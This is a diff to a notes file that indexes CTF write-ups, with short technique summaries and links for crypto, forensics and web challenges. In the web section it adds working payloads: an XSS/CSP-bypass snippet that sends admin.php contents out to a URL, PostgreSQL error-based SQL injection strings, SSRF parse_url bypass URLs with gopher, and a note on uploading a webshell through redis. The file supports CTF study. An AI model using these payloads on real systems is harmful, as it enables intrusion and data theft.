@@ -941,9 +941,15 @@ break playfair cipher given 4 ciphertexts of a plaintext that starts with known 
 https://ctftime.org/task/4510
 
 * liar's trap - mma-ctf-2017
-flag divided into N=100 pieces Shamir secret sharing so i can be recovered given at least K=25 pieces but L=38 pieces
-have been corrupted so use Reed-Solomon error-correcting codes
+flag divided into N=100 pieces Shamir secret sharing so i can be recovered given at least K=25 pieces but L=38 pieces have been corrupted
+use Reed-Solomon error-correcting codes
 https://galhacktictrendsetters.wordpress.com/2017/09/05/tokyo-westerns-ctf-2017-liars-trap/
+
+* babypinhole - mma-ctf-2017
+we have a Paillier cryptosystem. We are given a decryption oracle, which leaks only one bit in the middle of the plaintext
+due to homomorphic properties of the Paillier cryptosystem, we can recover the full decryption using such an oracle
+http://mslc.ctf.su/wp/twctf-2017-solutions-for-babypinhole-liars-trap-palindrome-pairs-challenge
+https://github.com/p4-team/ctf/tree/master/2017-09-02-tokyo/crypto_pinhole
 
 * bad aes - sect-ctf-2017
 aes with custom sbox missing last 16 bytes (patch pyaes to try all permutations)
@@ -961,6 +967,29 @@ https://gist.github.com/niklasb/84fb894c7658f29b21fd7b7e1704f799 using Wiener
 * extends me - backdoor-ctf-2017
 hash length extension with SLHA1 a variant of SHA1
 https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/backdoorctf-2017/web/extends-me-250
+
+* stereotype - backdoor-ctf-2017
+we are given a ciphertext and the plaintext but with the last chars of flag changed to X
+replace every X to null-bytes and apply Coppersmith Attack
+https://hva314.github.io/blog/2017/09/24/Backdoor-CTF-2017-Crypto.html
+
+* asymetric encryption - pwn2win-ctf-2017
+server provides public params for ElGamal, RSA and Paillier cryptosystems, but the params are small
+use baby-step-giant-step to compute the discrete log for ElGamal, yafu to factor modulus for RSA and Paillier
+RSA is homomorphic to the multiplication and powers so enc((31*a)^7) == pow(enc(31)*enc(a)%n,7,n)
+Pallier is homomorphic to the addition and the multiplication so enc(31*a+12*b+56) == (pow(E(a),31,n**2)*pow(E(b),12,n**2))*E(56)%n**2
+and with ElGamal enc(a^7) == [pow(enc(a)[0], 7, q), pow(enc(a)[1], 7, q))]
+https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/
+
+* differential privacy - pwn2win-ctf-2017
+differential privacy mechanism Laplace, service is adding laplace noise to each ascii char of the flag
+we know that Laplace(0, sensitivity/epsilon) has average 0 so if we average sufficient anonymized records of the flag
+the random noise added will be canceled and the original ascii values will be obtained
+https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/
+
+* escape from arkham - 3dsctf-2017
+sharmir's secret sharing
+https://ctftime.org/writeup/8424
 
 # }}}
 
@@ -1310,6 +1339,14 @@ https://nandynarwhals.org/hitbgsec2017-flyinghigh/
 * arrdeepee - hitb-ctf-singapore-2017
 decrypt RDP over SSL using pkcs12 transmitted over udp, and replay the RDP session
 https://nandynarwhals.org/hitbgsec2017-arrdeepee/
+
+* reading between the lines - square-ctf-2017
+tampered zip containing 4 files but only decompresses to 3 files because of tampered central directory
+https://pequalsnp-team.github.io/writeups/reading_between_the_lines
+
+* help - kaspersky-ctf-2017
+given memory dump, recover a KeePass database whose Master Key includes a Windows User Account
+http://blog.ghaaf.me/2017/10/14/kaspersky-ctf-help-forensic-500/
 
 # }}}
 
@@ -1916,15 +1953,15 @@ https://blog.tyage.net/?p=1043
 server doesn't check JSON parameter is a string so we can pass an array to guess length and value of the encryption key
 http://corb3nik.github.io/blog/tokyo-westerns-2017/super-secure-storage
 
-* funtimejs 2 - csaw-ctf-2017-quals
+* funtimejs 2 - csaw-ctf-2017
 web server runs user code in javascript vm, use fs module to read flag file
 console.log(require('fs').readFileSync('flag.txt').toString());
 
-* not my cup of coffee - csaw-ctf-2017-quals
+* not my cup of coffee - csaw-ctf-2017
 send serialized Java Bean object with a parent set to the Flag bean
 https://blog.ankursundara.com/csaw-ctf-quals-2017-not-my-cup-of-coffee/
 
-* shia labeouf off - csaw-ctf-2017-quals
+* shia labeouf off - csaw-ctf-2017
 django custom template filter tags and ssti
 https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/
 
@@ -1939,6 +1976,45 @@ https://github.com/p4-team/ctf/tree/master/2017-09-17-ekoparty/my_first_app_web
 * dark market - sect-ctf-2017
 graphql
 https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket
+
+* httpbin - defcamp-2017
+create a hostname with 2 A records (1.2.3.4 and 127.0.0.1) to bypass check that input hostname doesnt resolve to localhost
+send redis commands to upload webshell
+https://dciets.com/writeups/2017/10/04/dctf-secure-httpbin/
+
+* dctf llc - defcamp-2017
+xss & bypass CSP that allows script-src 'self' by uploading a GIF file with:
+GIF89a='MUMBOJUMBOBOGUSBACON';var r=new XMLHttpRequest();r.open("GET","admin.php",false);r.send();document.location="http://./?r="+btoa(r.responseText);
+https://steemit.com/ctf/@maniffin/defcamp-ctf-quals-2017-llc-webchall-writeup
+
+* dnssosecure - hack-lu-ctf-2017
+configure a BIND server with DNSSEC to returned a signed A record
+https://github.com/packdesys/ctf-writeups/tree/master/hacklu-2017/dnssosecure
+
+* criminals - pwn2win-ctf-2017
+HQL + pgsql, use query_to_xml('<arbitrary sql>') to execute subquery
+array_upper(xpath('row',query_to_xml('select cast(pg_ls_dir(CHR(46))as int)',true,false,'')),1) returns pg_xlog in error msg
+array_upper(xpath('row',query_to_xml('select cast(pg_ls_dir((SELECT column_name||CHR(44)||table_name FROM information_schema.columns c limit 1 offset 0)) as int)',true, false,'')),1)
+https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/
+
+* blackbox pentesting - pwn2win-ctf-2017
+xss to make admin post second xss to parent domain to retrieve cookie with flag (admin runs first xss from sandbox.bloodsuckers.world, but cookie is in bloodsuckers.world)
+use multiple username input fields to bypass 12-char server-side limit
+https://github.com/RapaceDiabolique/ctf_writeup/blob/master/Pwn2Win%20CTF%202017/BlackBox%20Pentesting.md
+
+* sqlsrf - seccon-ctf-2017
+wget bug, use newlines to append smtp commands through the Host: header and cross protocol talk to smtp server
+https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_sqlsrf
+
+* extract0r - 34c3ctf-2017
+upload zip containing a symlink using .blah to bypass filter and browse server's filesystem
+ssrf + parse_url bypass using http://foo@localhost:foo@google.com:3306/ or http://foo@[cafebabe.cf]@google.com:3306/
+use gopher:// and craft url to retrieve flag from mysql db
+https://github.com/eboda/34c3ctf/tree/master/extract0r
+
+* urlstorage - 34c3ctf-2017
+RPO and css seletor to bf admin token and retrieve flag
+https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/
 
 # }}}
 
@@ -2078,6 +2154,11 @@ https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Sm
 * jareCaptcha - sharif-ctf-2016
 sudoku solver and captcha bypass (reuse same captcha cookie id)
 https://github.com/p4-team/ctf/blob/master/2016-12-16-sharifctf7/web_200_jareCaptcha/README.md
+
+* old schoold - kaspersky-ctf-2017
+NES game, use FCEUX emulator to debug and patch
+http://www.codehead.co.uk/klctf2017-oldschool/
+
 # }}}
 
 # done (but skipped pwn & reverse tasks) {{{
@@ -2165,7 +2246,7 @@ https://github.com/p4-team/ctf/blob/master/2016-12-16-sharifctf7/web_200_jareCap
 * boston-key-party-2016
 * breakin-ctf-2016
 * codegate-ctf-2016
-* csaw-ctf-2016-quals
+* csaw-ctf-2016
 * ctfx-2016
 * cyber-security-challenge-belgium-2016-qualifiers
 * def-con-ctf-qualifiers-2016 skipped
@@ -2225,11 +2306,19 @@ https://github.com/p4-team/ctf/blob/master/2016-12-16-sharifctf7/web_200_jareCap
 * ctfzone-2017
 * asis-ctf-2017
 * sect-ctf-2017
-* csaw-ctf-2017-quals
+* csaw-ctf-2017
 * ekoparty-ctf-2017
 * backdoor-ctf-2017
 * defcamp-2017
-
+* hack.lu-ctf-2017
+* pwn2win-ctf-2017
+* kaspersky-ctf-2017
+* hitcon-ctf-quals-2017
+* codeblue-ctf-2017
+* tu-ctf-2017
+* seccon-ctf-2017
+* 3dsctf-2017
+* 34c3ctf-2017
 # }}}
 
 # to do {{{
@@ -2243,7 +2332,7 @@ https://github.com/smokeleeteveryday/CTF_WRITEUPS
 https://github.com/ispoleet/ctf-writeups bo1lers
 https://github.com/73696e65/ctf-notes
 
-* still online
+* challenges still online
 https://backdoor.sdslabs.co/challenges
 
 * all past writeups
@@ -2264,9 +2353,13 @@ Eat Sleep Pwn Repeat https://kitctf.de/
 kt (ex SpamAndHex! captain) https://kt.pe/blog/
 
 * crypto
+https://www.cryptologie.net/article/435/best-crypto-blog-posts-of-2017/
 https://grocid.net https://github.com/grocid/CTF
 https://grocid.net/2016/08/11/solving-problems-with-lattice-reduction/ explains lcg, crt, lattice reduction
 https://github.com/SideChannelMarvels/Deadpool (crypto)
+
+* web
+https://github.com/orangetw/My-CTF-Web-Challenges
 
 * exploit
 http://blog.rewolf.pl/blog/?p=1563
